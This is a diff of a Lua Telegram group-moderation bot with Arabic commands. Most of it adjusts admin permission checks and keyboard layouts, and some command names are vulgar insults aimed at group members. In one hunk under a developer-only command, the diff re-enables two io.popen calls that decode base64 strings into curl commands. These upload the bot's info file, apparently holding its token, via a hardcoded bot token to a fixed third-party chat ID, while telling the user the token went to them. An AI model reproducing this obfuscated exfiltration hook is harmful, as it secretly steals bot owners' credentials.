 t = "\n ☉┇ قائمة متناكين الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -9275,6 +9252,10 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع علي زبي") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9301,6 +9282,10 @@ return false
 end
 
 if (text == ("تنزيل من زبي")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9323,10 +9308,18 @@ return false
 end
 -----------------------------------------------------
 if text == 'مسح الاكساس' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'kss:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح كل الاكساس بالجروب')
 end
 if text == ("تاك للاكساس") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'kss:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة اكساس الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -9344,6 +9337,10 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع كس") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9370,6 +9367,10 @@ return false
 end
 
 if (text == ("تنزيل كس")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9392,10 +9393,18 @@ return false
 end
 -----------------------------------------------------
 if text == 'تنزيل البقرات' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Bakra:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم تنزيل جميع البقرات بالجروب')
 end
 if text == ("تاك للبقرات") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Bakra:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة البقرات الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -9413,6 +9422,10 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع بقره") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9439,6 +9452,10 @@ return false
 end
 
 if (text == ("تنزيل بقره")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9461,10 +9478,18 @@ return false
 end
 -----------------------------------------------------
 if text == 'تنزيل الطليان' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Tele:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم تنزيل جميع طليان بالجروب')
 end
 if text == ("تاك للطليان") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Tele:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة الطليان الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -9482,6 +9507,10 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع طلي") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9508,6 +9537,10 @@ return false
 end
 
 if (text == ("تنزيل طلي")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9530,10 +9563,18 @@ return false
 end
 -----------------------------------------------------
 if text == 'مسح الحكاكين' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Zahf:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح كل الحكاكين')
 end
 if text == ("تاك للحكاكين") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة حكاكين الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -9551,6 +9592,10 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع حكاك") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9577,6 +9622,10 @@ return false
 end
 
 if (text == ("تنزيل حكاك")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9599,10 +9648,18 @@ return false
 end
 -----------------------------------------------------
 if text == 'تنزيل خنزيره' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Jred:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم تنزيل جميع جريزي')
 end
 if text == ("تاك للخنازير") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Jred:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة خنازير الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -9620,6 +9677,10 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع خنزير") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9646,6 +9707,10 @@ return false
 end
 
 if (text == ("تنزيل خنزير")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -10614,11 +10679,7 @@ send(msg.chat_id_, msg.id_,Textt)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
 end
-if text == ("رفع مشرف") and msg.reply_to_message_id_ ~= 0 then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end
+if text == ("رفع مشرف") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
 function start_function(extra, result, success)
 if msg.can_be_deleted_ == false then 
 send(msg.chat_id_, msg.id_,' ☉┇ البوت ليس ادمن يرجى ترقيتي !') 
@@ -10658,11 +10719,7 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 return false
 end
-if text == ("تنزيل مشرف") and msg.reply_to_message_id_ ~= 0 then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end
+if text == ("تنزيل مشرف") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
 function start_function(extra, result, success)
 if msg.can_be_deleted_ == false then 
 send(msg.chat_id_, msg.id_,' ☉┇ البوت ليس ادمن يرجى ترقيتي !') 
@@ -10704,11 +10761,7 @@ return false
 end
 
 
-if text == ("رفع مشرف") and msg.reply_to_message_id_ ~= 0 then
-if not BasicConstructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
-return false
-end
+if text == ("رفع مشرف") and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
 function start_function(extra, result, success)
 if msg.can_be_deleted_ == false then 
 send(msg.chat_id_, msg.id_,' ☉┇ البوت ليس ادمن يرجى ترقيتي !') 
@@ -10748,11 +10801,7 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 return false
 end
-if text == ("تنزيل مشرف") and msg.reply_to_message_id_ ~= 0 then
-if not BasicConstructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
-return false
-end
+if text == ("تنزيل مشرف") and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
 function start_function(extra, result, success)
 if msg.can_be_deleted_ == false then 
 send(msg.chat_id_, msg.id_,' ☉┇ البوت ليس ادمن يرجى ترقيتي !') 
@@ -10899,8 +10948,8 @@ if not SudoBot(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
 return false
 end 
---io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
---io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
 send(msg.chat_id_, msg.id_,' تم ارسال توكن البوت في الخاص')
 end
 ----------------------------------------- انتهاء المميزات
@@ -12968,11 +13017,7 @@ database:srem(bot_id.."botss:DRAGON:List:Rd:Sudo", text)
 return false
 end
 end
-if text == ("مسح الردود المتعدده") then
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end
+if text == ("مسح الردود المتعدده") and CoSu(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -13205,12 +13250,12 @@ local video = database:get(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
 local document = database:get(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
 local audio = database:get(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
 ------------------------------------------------------------------------
-if text and text:match("^قول (.*)$") and not database:get(bot_id.."Speak:after:me"..msg.chat_id_) then
+if text and text:match("^قول (.*)$") then
 local Textxt = text:match("^قول (.*)$")
 send(msg.chat_id_, msg.id_, '['..Textxt..']')
 end
 if text == "راسلني" then
-rpl = {"اي","انطق","قول","نعم","عندكو شامبو","الكوسه بكام"};
+rpl = {"ها هلاو","انطق","قول","نعم"};
 sender = rpl[math.random(#rpl)]
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.sender_user_id_ .. '&text=' .. URL.escape(sender))
@@ -13236,11 +13281,7 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 
-if text == ("مسح لقب") and msg.reply_to_message_id_ ~= 0 then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end
+if text == ("مسح لقب") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
 function start_function(extra, result, success)
 if msg.can_be_deleted_ == false then 
 send(msg.chat_id_, msg.id_,' ☉┇ البوت ليس مشرف يرجى ترقيتي !') 
@@ -13373,11 +13414,7 @@ send(msg.chat_id_, msg.id_,ramsesj20)
 end
 
 
-if text == ("الردود المتعدده") then
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end
+if text == ("الردود المتعدده") and CoSu(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -13398,11 +13435,7 @@ text = "لا توجد ردود متعدده"
 end
 send(msg.chat_id_, msg.id_,"["..text.."]")
 end
-if text == "اضف رد متعدد" then
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end
+if text == "اضف رد متعدد" and CoSu(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -13415,11 +13448,7 @@ end
 database:set(bot_id.."botss:DRAGON:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
 return send(msg.chat_id_, msg.id_,"☉┇ارسل الرد الذي اريد اضافته")
 end
-if text == "مسح رد متعدد" then
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end
+if text == "مسح رد متعدد" and CoSu(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -13694,11 +13723,7 @@ Text = '\n ☉┇ بالتاكيد تم تعطيل الايدي بالصوره'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل الحظر' then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end   
+if text == 'تفعيل الحظر' and Constructor(msg) then   
 if database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
 database:del(bot_id..'Lock:kick'..msg.chat_id_) 
 Text = '\n ☉┇ تم تفعيل الحظر' 
@@ -13707,11 +13732,7 @@ Text = '\n ☉┇ بالتاكيد تم تفعيل الحظر'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل الحظر' then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end  
+if text == 'تعطيل الحظر' and Constructor(msg) then  
 if not database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
 database:set(bot_id..'Lock:kick'..msg.chat_id_,true) 
 Text = '\n ☉┇ تم تعطيل الحظر' 
@@ -13720,11 +13741,7 @@ Text = '\n ☉┇ بالتاكيد تم تعطيل الحظر'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل الرفع' then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end   
+if text == 'تفعيل الرفع' and Constructor(msg) then   
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
 database:del(bot_id..'Lock:Add:Bot'..msg.chat_id_) 
 Text = '\n ☉┇ تم تفعيل الرفع' 
@@ -13733,11 +13750,7 @@ Text = '\n ☉┇ بالتاكيد تم تفعيل الرفع'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل الرفع' then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end  
+if text == 'تعطيل الرفع' and Constructor(msg) then  
 if not database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
 database:set(bot_id..'Lock:Add:Bot'..msg.chat_id_,true) 
 Text = '\n ☉┇ تم تعطيل الرفع' 
@@ -14015,11 +14028,7 @@ Text = ' ☉┇ بالتاكيد تم تفعيل امر صيح'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تنزيل جميع الرتب' then
-if not BasicConstructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
-return false
-end  
+if text == 'تنزيل جميع الرتب' and BasicConstructor(msg) then  
 database:del(bot_id..'Constructor'..msg.chat_id_)
 database:del(bot_id..'Manager'..msg.chat_id_)
 database:del(bot_id..'Mod:User'..msg.chat_id_)
@@ -15702,16 +15711,6 @@ end
 end
 
 
-if text and text:match("^تغير رد المطور الاساسي (.*)$") and Manager2(msg) then
-local Teext = text:match("^تغير رد المطور الاساسي (.*)$") 
-database:set(bot_id.."SudoBot"..msg.chat_id_)
-send(msg.chat_id_, msg.id_," ☉┇ تم تغير رد المطور الاساسي الى » "..Teext)
-end
-if text and text:match("^تغير رد المطور الثاني (.*)$") and Manager2(msg) then
-local Teext = text:match("^تغير رد المطور الثاني (.*)$") 
-database:set(bot_id.."Dev:SoFi:2:Rd"..msg.chat_id_,Teext)
-send(msg.chat_id_, msg.id_," ☉┇ تم تغير رد المطور الثاني الى » "..Teext)
-end
 if text and text:match("^تغير رد المطور (.*)$") and Manager2(msg) then
 local Teext = text:match("^تغير رد المطور (.*)$") 
 database:set(bot_id.."Sudo:Rd"..msg.chat_id_,Teext)
@@ -15732,25 +15731,10 @@ local Teext = text:match("^تغير رد المنشئ (.*)$")
 database:set(bot_id.."Constructor:Rd"..msg.chat_id_,Teext)
 send(msg.chat_id_, msg.id_," ☉┇ تم تغير رد المنشئ الى » "..Teext)
 end
-if text and text:match("^تغير رد المدير العام (.*)$") and Manager2(msg) then
-local Teext = text:match("^تغير رد المدير العام (.*)$") 
-database:set(bot_id.."Gmanager:Rd"..msg.chat_id_,Teext)
-send(msg.chat_id_, msg.id_," ☉┇ تم تغير رد المدير العام الى » "..Teext)
-end
 if text and text:match("^تغير رد المدير (.*)$") and Manager2(msg) then
 local Teext = text:match("^تغير رد المدير (.*)$") 
 database:set(bot_id.."Manager:Rd"..msg.chat_id_,Teext) 
 send(msg.chat_id_, msg.id_," ☉┇ تم تغير رد المدير الى » "..Teext)
-end
-if text and text:match("^تغير رد المدير الثاني (.*)$") and Manager2(msg) then
-local Teext = text:match("^تغير رد المدير الثاني (.*)$") 
-database:set(bot_id.."S00F4:MN:TF:Rd"..msg.chat_id_,Teext) 
-send(msg.chat_id_, msg.id_," ☉┇ تم تغير رد المدير الثاني الى » "..Teext)
-end
-if text and text:match("^تغير رد الادمن العام (.*)$") and Manager2(msg) then
-local Teext = text:match("^تغير رد الادمن العام (.*)$") 
-database:set(bot_id.."Gmod:Rd"..msg.chat_id_,Teext)
-send(msg.chat_id_, msg.id_," ☉┇ تم تغير رد الادمن العام الى » "..Teext)
 end
 if text and text:match("^تغير رد الادمن (.*)$") and Manager2(msg) then
 local Teext = text:match("^تغير رد الادمن (.*)$") 
@@ -15769,28 +15753,6 @@ send(msg.chat_id_, msg.id_," ☉┇ تم تغير رد العضو الى » "..T
 end
 
 ---------------------- الاوامر الجديده
-if text == "من سيربح المليون" or text == 'الاسئله' then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
-end
-local Text =[[
-لعبه من سيربح المليون .
-لعبه ترفيهيه.
-تحتوي علي ٣ مستويات. 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = 'ابدء لعب المستوي الاول ' callback_data="mel1"}},
-{{text = ' معلومات عن اللعبه ' callback_data="melinfo"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
 if text == 'الاوامر' then
 if not Mod(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام الاوامر')
@@ -15812,10 +15774,18 @@ local Text =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"}},
-{{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"}},
-{{text = 'اوامر التسليه', callback_data="/help7"}},
-{{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"}},
+{
+{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
+},
+{
+{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
+},
+{
+{text = 'اوامر التسليه', callback_data="/help7"},
+},
+{
+{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
+},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -15890,21 +15860,6 @@ local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 return false
 end
-if text == "غنيلي" and not database:get(bot_id.."sing:for:me"..msg.chat_id_) then
-data,res = https.request('https://black-source.tk/BlackTeAM/audios.php')
-if res == 200 then
-audios = json:decode(data)
-if audios.Info == true then
-local Text ='☉┇ تم اختيار المقطع الصوتي لك'
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = 'مقطع اخر.' ,callback_data="/voice1"}},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
-end
-end
 ----------------------------------------------------------------- انتهئ الاوامر الجديدة
 if database:get(bot_id..'Zrf:add'..msg.chat_id_..''..msg.sender_user_id_) then 
 if text == 'الغاء' then 
@@ -15929,6 +15884,10 @@ database:setex(bot_id.."Zrf:add"..msg.chat_id_..""..msg.sender_user_id_,10000,tr
 send(msg.chat_id_, msg.id_, '☉┇ ارسل لي الكلمه لزخرفتها ')
 end
 if text == "تعطيل الزخرفه" then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if not Mod(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
 return false
@@ -16199,10 +16158,18 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"}},
-{{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"}},
-{{text = 'اوامر التسليه', callback_data="/help7"}},
-{{text = '⌯ قفل و القفل ⌯', callback_data="/help"},{text = 'تعطيل و تفعيل', callback_data="/help2"}},
+{
+{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
+},
+{
+{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
+},
+{
+{text = 'اوامر التسليه', callback_data="/help7"},
+},
+{
+{text = '⌯ قفل و القفل ⌯', callback_data="/help"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
+},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -16250,10 +16217,18 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"}},
-{{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"}},
-{{text = 'اوامر التسليه', callback_data="/help7"}},
-{{text = 'قفل و القفل', callback_data="/help1"},{text = '⌯ تعطيل و تفعيل ⌯', callback_data="/help"}},
+{
+{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
+},
+{
+{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
+},
+{
+{text = 'اوامر التسليه', callback_data="/help7"},
+},
+{
+{text = 'قفل و القفل', callback_data="/help1"},{text = '⌯ تعطيل و تفعيل ⌯', callback_data="/help"},
+},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -16312,10 +16287,18 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '⌯ ❶️❶ ⌯', callback_data="/help"},{text = '❷❷', callback_data="/help4"}},
-{{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"}},
-{{text = 'اوامر التسليه', callback_data="/help7"}},
-{{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"}},
+{
+{text = '⌯ ❶️❶ ⌯', callback_data="/help"},{text = '❷❷', callback_data="/help4"},
+},
+{
+{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
+},
+{
+{text = 'اوامر التسليه', callback_data="/help7"},
+},
+{
+{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
+},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -16407,10 +16390,18 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '❶️❶', callback_data="/help3"},{text = '⌯ ❷❷ ⌯', callback_data="/help"}},
-{{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"}},
-{{text = 'اوامر التسليه', callback_data="/help7"}},
-{{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"}},
+{
+{text = '❶️❶', callback_data="/help3"},{text = '⌯ ❷❷ ⌯', callback_data="/help"},
+},
+{
+{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
+},
+{
+{text = 'اوامر التسليه', callback_data="/help7"},
+},
+{
